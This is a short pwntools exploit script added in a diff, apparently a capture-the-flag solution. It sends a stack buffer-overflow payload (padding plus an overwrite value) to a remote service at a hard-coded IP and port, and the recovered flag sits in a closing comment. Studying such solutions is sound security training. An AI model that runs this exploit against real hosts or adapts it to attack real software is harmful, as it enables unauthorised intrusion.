@@ -1,0 +1,14 @@
+from pwn import *
+
+script = '''
+b *main
+breakrva 0x13E0
+'''
+
+p = remote("103.69.97.144", 6001)
+
+payload = b"A" * 0x4c + p32(0x13141516)
+p.sendlineafter(b"number: ", payload)
+
+p.interactive()
+#BKSEC{\xBuffer\xOv3rfl0w\x1s\xchiLL}
